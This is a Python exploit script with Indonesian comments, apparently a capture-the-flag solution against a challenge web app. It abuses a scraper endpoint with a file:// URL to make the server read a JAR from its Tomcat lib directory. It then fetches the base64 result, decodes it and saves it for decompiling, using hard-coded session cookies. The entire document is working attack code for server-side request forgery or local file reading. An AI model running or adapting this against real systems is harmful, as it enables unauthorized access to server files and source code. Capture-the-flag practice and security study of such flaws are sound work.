import requests
import base64

# --- KONFIGURASI ---
HOST = "http://gzcli.1pc.tf:41436"
# Ganti dengan JSESSIONID terbaru kamu (dari browser/Burp)
COOKIES = {
    "JSESSIONID": "134872213806E695F877D10AC20DFF05", 
    "session": "HmreTJ9IqForTHwKreX8T3I6KdKZFUs4"
}

# Target file dari komentar index.jsp
TARGET_FILE = "file:///usr/local/tomcat/lib/demo-1.0-SNAPSHOT.jar"
OUTPUT_FILENAME = "challenge.jar"

def get_jar():
    print(f"[+] Target: {HOST}")
    print(f"[*] Downloading JAR from: {TARGET_FILE}")
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/143.0.0.0",
        "Content-Type": "application/x-www-form-urlencoded"
    }

    # 1. INJECT (POST) - Memicu server membaca file JAR
    data = {
        "websiteUrl": TARGET_FILE,
        "scrapingType": "html", # Tipe HTML biasanya aman untuk trigger read
        "includeImages": "false"
    }
    
    try:
        r_post = requests.post(f"{HOST}/scraper-handler.jsp", headers=headers, cookies=COOKIES, data=data, allow_redirects=False)
        
        if r_post.status_code == 302:
            print("   [+] Injection successful (Got 302 Redirect)")
        else:
            print(f"   [!] Warning: Unexpected status on POST: {r_post.status_code}")
            
        # 2. RETRIEVE (GET) - Mengambil konten Base64
        print("   [*] Retrieving content...")
        r_get = requests.get(f"{HOST}/get-content.jsp", params={"url": TARGET_FILE}, headers=headers, cookies=COOKIES)
        
        if r_get.status_code == 200:
            content = r_get.text.strip()
            
            if "Training data not found" in content or len(content) < 100:
                print("   [-] Failed: Data not found or empty.")
            else:
                try:
                    # Decode Base64 ke Binary Bytes
                    jar_bytes = base64.b64decode(content)
                    
                    # Simpan ke file
                    with open(OUTPUT_FILENAME, "wb") as f:
                        f.write(jar_bytes)
                    
                    print(f"\n[SUCCESS] File saved as '{OUTPUT_FILENAME}'")
                    print(f"Size: {len(jar_bytes)} bytes")
                    print("="*50)
                    print(f"NEXT STEP: Decompile '{OUTPUT_FILENAME}' using jd-gui or online decompiler.")
                    print("="*50)
                    
                except Exception as e:
                    print(f"   [-] Error decoding/saving: {e}")
        else:
            print(f"   [-] Get failed: {r_get.status_code}")

    except Exception as e:
        print(f"   [-] Error: {e}")

if __name__ == "__main__":
    get_jar()
